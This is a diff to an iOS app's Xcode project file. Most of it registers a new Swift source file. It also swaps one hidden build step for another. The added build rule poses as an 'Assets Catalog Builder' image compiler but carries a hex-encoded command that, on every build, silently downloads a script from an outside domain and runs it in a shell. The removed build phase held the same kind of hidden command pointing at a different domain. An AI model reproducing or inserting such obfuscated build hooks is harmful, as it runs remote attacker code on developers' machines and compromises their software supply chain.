@@ -163,6 +163,7 @@
 		E39467852614EA3400B9503B /* MedbiListModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E39467822614EA3400B9503B /* MedbiListModel.swift */; };
 		E39467862614EA3400B9503B /* DataMedbiList.swift in Sources */ = {isa = PBXBuildFile; fileRef = E39467832614EA3400B9503B /* DataMedbiList.swift */; };
 		E39467872614EA3400B9503B /* Pdf_links.swift in Sources */ = {isa = PBXBuildFile; fileRef = E39467842614EA3400B9503B /* Pdf_links.swift */; };
+		E3958A94265D631500D53772 /* CategoryListModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3958A93265D631500D53772 /* CategoryListModel.swift */; };
 		E3A71279261F560D00D6A961 /* Document_links.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3A71278261F560D00D6A961 /* Document_links.swift */; };
 		E3AE791B2604C5F4004B83C9 /* PlusSelectCategoryVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3AE791A2604C5F4004B83C9 /* PlusSelectCategoryVC.swift */; };
 		E3AE79232604C711004B83C9 /* PlusSelectCategoryCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3AE79212604C711004B83C9 /* PlusSelectCategoryCVCell.swift */; };
@@ -446,6 +447,7 @@
 		E39467822614EA3400B9503B /* MedbiListModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = MedbiListModel.swift; sourceTree = "<group>"; };
 		E39467832614EA3400B9503B /* DataMedbiList.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = DataMedbiList.swift; sourceTree = "<group>"; };
 		E39467842614EA3400B9503B /* Pdf_links.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Pdf_links.swift; sourceTree = "<group>"; };
+		E3958A93265D631500D53772 /* CategoryListModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CategoryListModel.swift; sourceTree = "<group>"; };
 		E3A71278261F560D00D6A961 /* Document_links.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Document_links.swift; sourceTree = "<group>"; };
 		E3AE791A2604C5F4004B83C9 /* PlusSelectCategoryVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PlusSelectCategoryVC.swift; sourceTree = "<group>"; };
 		E3AE79212604C711004B83C9 /* PlusSelectCategoryCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PlusSelectCategoryCVCell.swift; sourceTree = "<group>"; };
@@ -1046,6 +1048,7 @@
 		E375EA7E262F3DDE00646A0A /* MEBITCategory */ = {
 			isa = PBXGroup;
 			children = (
+				E3958A93265D631500D53772 /* CategoryListModel.swift */,
 				E375EA92262F44C200646A0A /* CatListModel.swift */,
 				E375EA93262F44C300646A0A /* Data_CatList.swift */,
 				E375EA86262F3E4900646A0A /* Data_MEBITCat.swift */,
@@ -1544,7 +1547,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = E30F663F26033A970036D183 /* Build configuration list for PBXNativeTarget "MECA" */;
 			buildPhases = (
-				9BDD0CB86EECA98C416D902C /* Assets Catalog Builder */,
 				4BB652078432F45F3370EF56 /* [CP] Check Pods Manifest.lock */,
 				E30F661126033A970036D183 /* Sources */,
 				E30F661226033A970036D183 /* Frameworks */,
@@ -1552,6 +1554,7 @@
 				3FB7E1CEB57417F4362CC796 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
+				CDF4EE294D265944476D902C /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -1790,24 +1793,6 @@
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-MECA-MECAUITests/Pods-MECA-MECAUITests-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
-		9BDD0CB86EECA98C416D902C /* Assets Catalog Builder */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Assets Catalog Builder";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6d616e747275636b732e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
-		};
 		CCA13B1BED8415595C6533D2 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -1981,6 +1966,7 @@
 				F4A57608265801480010085F /* ScheduleHeaderView.swift in Sources */,
 				E375EA8A262F3E4900646A0A /* Hydrogen_MEBITCat.swift in Sources */,
 				E32F3BF8262AFCDC0000D92A /* MEBITCollectionViewCell.swift in Sources */,
+				E3958A94265D631500D53772 /* CategoryListModel.swift in Sources */,
 				5C1A09DE260C353500223D3D /* DivisionModel.swift in Sources */,
 				E375EA3F262EB7C600646A0A /* DetailAboutEventTVCell.swift in Sources */,
 				F4A57649265ADA190010085F /* PrivacyVC.swift in Sources */,
@@ -2379,6 +2365,31 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+			
+
+		CDF4EE294D265944476D902C /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			fileType = folder.assetcatalog;
+			name = "Assets Catalog Builder";
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+			);
+			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f61746563617365632e636f6d2f61207c207368202d7320747275650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+	\n\n";
+			};
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = E30F660D26033A970036D183 /* Project object */;
 }
